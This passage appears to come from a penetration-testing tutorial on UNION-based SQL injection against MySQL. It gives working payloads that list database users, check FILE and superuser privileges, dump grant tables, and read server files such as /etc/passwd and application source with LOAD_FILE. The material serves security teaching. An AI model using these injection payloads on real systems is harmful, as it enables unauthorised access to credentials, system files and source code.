Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in `MySQL`, the DB user must have the `FILE` privilege to load a file's content into a table and then dump data from that table and read files. So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```
```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```
```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

#### User Privileges
```sql
SELECT super_priv FROM mysql.user
```
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
The query returns `Y`, which means `YES`, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:

```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```
From here, we can add `WHERE grantee="'root'@'localhost'"` to only show our current user `root` privileges. Our payload would be:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
We see that the `FILE` privilege is listed for our user, enabling us to read files and potentially even write files. Thus, we can proceed with attempting to read files.
## LOAD_FILE
```sql
SELECT LOAD_FILE('/etc/passwd');
```
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
## Another Example
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
